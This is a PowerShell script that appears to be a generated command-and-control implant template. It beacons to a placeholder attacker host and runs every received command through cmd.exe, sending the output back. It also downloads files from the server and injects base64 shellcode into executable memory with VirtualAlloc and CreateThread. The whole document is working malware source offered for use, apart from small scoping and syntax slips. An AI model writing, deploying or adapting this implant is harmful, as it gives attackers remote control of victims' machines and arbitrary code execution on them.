$C2_URL = 'http://{lhost}:{lport}'
$CLIENT_ID = '{line}'

function Send-Request {
    param (
        [string]$url,
        [string]$method = 'GET',
        [string]$body = '',
        [string]$username = '{username}',
        [string]$password = '{password}'
    )

    $headers = @{
        'Authorization' = 'Basic ' + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$username`:$password"))
    }
    
    if ($method -eq 'POST') {
        $headers['Content-Type'] = 'application/json'
    }

    try {
        if ($method -eq 'GET') {
            $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers
        } elseif ($method -eq 'POST') {
            $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
        } else {
            throw "Unsupported HTTP method: $method"
        }
        return $response
    } catch {
        Write-Error "Error in Send-Request: $_"
        return $null
    }
}

function Escn {
    param (
        [string]$shellcode
    )

    $Win32 = @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
"@

    Add-Type -TypeDefinition $Win32

    $shellcodeBytes = [System.Convert]::FromBase64String($shellcode)
    
    $size = $shellcodeBytes.Length
    
    $allocationType = 0x3000  # MEM_COMMIT | MEM_RESERVE
    $protectionType = 0x40    # PAGE_EXECUTE_READWRITE

    $pointer = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, $allocationType, $protectionType)
    
    [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $pointer, $size)

    $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $pointer, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    # Usar 0xFFFFFFFF como valor hexadecimal para representar -1
    $result = [Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)

    return $result
}

while ($true) {
    try {
        $command = Send-Request "$C2_URL/command/$CLIENT_ID"

        if ($command) {
            if ($command -match 'terminate') {
                break
            } elseif ($command -match '^sc:') {
                $sc = $command -replace '^sc:', ''
                Escn $sc
            } elseif ($command -match '^download:') {
                $file_path = $command -replace '^download:', ''
                $file_url = "$C2_URL/download/$file_path"
                $file_name = [System.IO.Path]::GetFileName($file_path)
                Invoke-RestMethod -Uri $file_url -Method Get -Headers $headers -OutFile $file_name
                if (Test-Path $file_name) {
                    Write-Output "[INFO] File downloaded: $file_name"
                } else {
                    Write-Error "[ERROR] File download failed: $file_name"
                }
            } else {
                $output = cmd.exe /c $command 2>&1
                $json_data = @{ output = $output, client = 'Windows' } | ConvertTo-Json -Depth 10
                Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
            }
        }

        Start-Sleep -Seconds 5
    } catch {
        Write-Error "Error in main loop: $_"
        break
    }
}
